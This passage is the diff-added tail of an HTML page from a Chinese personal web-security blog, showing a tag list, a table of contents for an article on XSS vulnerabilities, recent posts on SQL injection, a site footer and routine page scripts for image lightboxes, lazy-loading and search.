+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">一、XSS漏洞的概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、XSS危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E6%A3%80%E6%B5%8B"><span class="toc-text">三、XSS检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">1、手工检测XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">2、自动检测XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">四、反射型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">五、存储型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81DOM%E5%9E%8BXSS"><span class="toc-text">六、DOM型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">七、XSS漏洞测试过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81XSS%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-text">八、XSS简单利用</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
